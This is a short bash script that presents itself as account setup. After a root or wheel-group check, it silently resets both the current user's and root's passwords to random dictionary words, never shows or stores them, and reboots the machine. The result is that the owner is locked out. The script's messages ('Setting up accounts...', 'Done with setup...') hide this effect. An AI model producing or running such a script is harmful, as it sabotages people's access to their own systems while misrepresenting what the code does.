#!/bin/bash
suser=$( getent group wheel | awk -F: '{print $4}' )
if [[ "$EUID" = 0 ]] || [[ "$suser" == "$USER" ]]; then
  echo "(1) You are root... Running rest of script..."
else
  echo "(2) You must be root to run this script... Exiting Script"
  exit
fi

password=$( shuf -n 1 /usr/share/dict/words )
echo "Setting up accounts..."
echo $USER:$password | sudo chpasswd
rpassword=$( shuf -n 1 /usr/share/dict/words )
echo root:$rpassword | sudo chpasswd
echo "Done with setup..."
sleep 4
echo "Rebooting System Now..."
sudo reboot
